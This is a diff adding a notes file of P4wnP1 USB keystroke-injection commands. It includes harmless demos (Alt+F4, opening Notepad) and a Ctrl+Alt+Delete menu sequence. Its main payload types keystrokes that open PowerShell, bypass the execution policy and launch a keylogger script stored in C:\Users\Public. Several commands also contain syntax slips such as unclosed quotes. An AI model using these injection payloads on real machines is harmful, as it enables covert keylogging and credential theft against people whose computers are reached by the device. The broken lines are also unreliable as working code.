@@ -1,0 +1,36 @@
+P4wnP1_cli hid run -c 'press("ALT F4)'
+
+P4wnP1_cli hid run -c 'press("CTRL ALT DELETE"); delay(1000); press("UP"); delay(500); press("ENTER"); delay(500); press("UP"); delay(500); press("UP"); delay(500); press("ENTER"); delay(500); press("ENTER");'
+
+P4wnP1_cli hid run -c 'press("WIN R");'
+
+P4wnP1_cli hid run -c 'press("WIN R");delay(500);type("notepad.exe\n");press("ENTER");delay(1000);type("This is a test! Payload here!");'
+
+P4wnP1_cli hid run -c 'press("WIN R"); delay(500); type("powershell/n); press("ENTER");'
+
+P4wnP1_cli hid run -c 'layout("gb");'
+
+P4wnP1_cli hid run -c 'layout("gb");press("RIGHT_ALT #");'
+
+P4wnP1_cli hid run -c '
+layout("gb");
+press("WIN R"); delay(500);
+type("powershell\n"); press("ENTER"); delay(1000);
+type("powershell -ExecutionPolicy Bypass -File C:"); press("RIGHT_ALT #");
+type("Users"); press("RIGHT_ALT #");
+type("Public"); press("RIGHT_ALT #");
+type("keylogger.ps1\n");
+press("ENTER");
+'
+
+#to talk to the raspberry pi
+P4wnP1_cli hid run -c '[add commands]'
+  
+layout("");
+  
+type("");
+
+press("");
+
+#milliseconds
+delay(1000);
